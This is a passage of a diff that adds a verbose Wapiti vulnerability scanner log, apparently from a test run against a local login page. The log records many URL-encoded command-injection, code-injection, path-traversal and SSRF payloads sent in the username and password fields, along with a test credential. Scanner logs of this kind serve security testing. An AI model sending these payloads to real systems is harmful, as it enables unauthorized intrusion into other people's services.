+	data: username=fuzz&password=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.141 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.153 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.163 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.172 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.183 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.193 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.203 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.213 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.223 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.234 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.244 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 14:24:17.254 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=a%60%29%60
+2024-03-20 14:24:17.264 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=a%60sleep%2060%60
+2024-03-20 14:24:17.273 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=a%3Bsleep%2060%3B
+2024-03-20 14:24:17.283 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=a%7Csleep%2060%3B
+2024-03-20 14:24:17.294 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 14:24:17.311 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_
+2024-03-20 14:24:17.313 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%3Benv%3B&password=Letm3in_
+2024-03-20 14:24:17.324 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%7Cenv%7C&password=Letm3in_
+2024-03-20 14:24:17.335 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=a%3Benv%3B&password=Letm3in_
+2024-03-20 14:24:17.346 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=a%3Benv%3B&password=Letm3in_
+2024-03-20 14:24:17.356 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&password=Letm3in_
+2024-03-20 14:24:17.363 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%3Benv%3B&password=Letm3in_
+2024-03-20 14:24:17.372 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%0Aenv%3B&password=Letm3in_
+2024-03-20 14:24:17.380 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%26set%26&password=Letm3in_
+2024-03-20 14:24:17.388 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=set&password=Letm3in_
+2024-03-20 14:24:17.396 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=env&password=Letm3in_
+2024-03-20 14:24:17.404 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%2Fe%00&password=Letm3in_
+2024-03-20 14:24:17.412 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=Letm3in_
+2024-03-20 14:24:17.422 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=Letm3in_
+2024-03-20 14:24:17.433 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=Letm3in_
+2024-03-20 14:24:17.444 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=Letm3in_
+2024-03-20 14:24:17.454 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=Letm3in_
+2024-03-20 14:24:17.461 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=Letm3in_
+2024-03-20 14:24:17.469 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=Letm3in_
+2024-03-20 14:24:17.477 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=Letm3in_
+2024-03-20 14:24:17.487 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=Letm3in_
+2024-03-20 14:24:17.497 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=Letm3in_
+2024-03-20 14:24:17.509 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=Letm3in_
+2024-03-20 14:24:17.522 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=Letm3in_
+2024-03-20 14:24:17.534 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&password=Letm3in_
+2024-03-20 14:24:17.547 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=a%60%29%60&password=Letm3in_
+2024-03-20 14:24:17.560 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=a%60sleep%2060%60&password=Letm3in_
+2024-03-20 14:24:17.572 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=a%3Bsleep%2060%3B&password=Letm3in_
+2024-03-20 14:24:17.585 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=a%7Csleep%2060%3B&password=Letm3in_
+2024-03-20 14:24:17.597 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=%26ping%20-n%2025%20127.0.0.1%26&password=Letm3in_
+2024-03-20 14:24:17.613 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%3Benv%3B
+2024-03-20 14:24:17.626 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%7Cenv%7C
+2024-03-20 14:24:17.638 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=a%3Benv%3B
+2024-03-20 14:24:17.647 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=a%3Benv%3B
+2024-03-20 14:24:17.657 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 14:24:17.670 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%3Benv%3B
+2024-03-20 14:24:17.682 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%0Aenv%3B
+2024-03-20 14:24:17.694 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%26set%26
+2024-03-20 14:24:17.709 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=set
+2024-03-20 14:24:17.722 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=env
+2024-03-20 14:24:17.732 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%2Fe%00
+2024-03-20 14:24:17.740 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.748 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.756 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.763 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.772 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.780 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.789 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.797 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.807 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.816 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.824 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.832 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:24:17.840 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 14:24:17.848 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=a%60%29%60
+2024-03-20 14:24:17.857 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=a%60sleep%2060%60
+2024-03-20 14:24:17.866 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=a%3Bsleep%2060%3B
+2024-03-20 14:24:17.874 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=a%7Csleep%2060%3B
+2024-03-20 14:24:17.882 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 14:24:17.914 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 14:24:17.926 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/users/login.php (1)
+2024-03-20 14:24:17.934 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz
+2024-03-20 14:24:17.934 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/users/login.php (0)
+	data: username=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fh7anb0%2F1%2F757365726e616d65%2F&password=fuzz
+2024-03-20 14:24:17.943 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fh7anb0%2F1%2F70617373776f7264%2F
+2024-03-20 14:24:17.960 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_
+2024-03-20 14:24:17.961 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/users/login.php (1)
+	data: username=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fh7anb0%2F2%2F757365726e616d65%2F&password=Letm3in_
+2024-03-20 14:24:17.969 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fh7anb0%2F2%2F70617373776f7264%2F
+2024-03-20 14:24:17.991 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=h7anb0 for results, please wait...
+2024-03-20 14:24:20.078 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 14:24:20.093 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/users/login.php (1)
+2024-03-20 14:24:20.119 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 14:24:20.134 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/users/login.php (1)
+2024-03-20 14:24:20.145 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz
+2024-03-20 14:24:20.179 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_
+2024-03-20 14:24:20.214 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 14:24:20.228 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/users/login.php (1)
+2024-03-20 14:24:20.251 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz
+2024-03-20 14:24:20.271 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_
+2024-03-20 14:24:20.352 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 14:24:20.381 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//login.json/
+2024-03-20 14:24:20.381 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//login.json/web_03202024_1424.html with a browser to see this report.
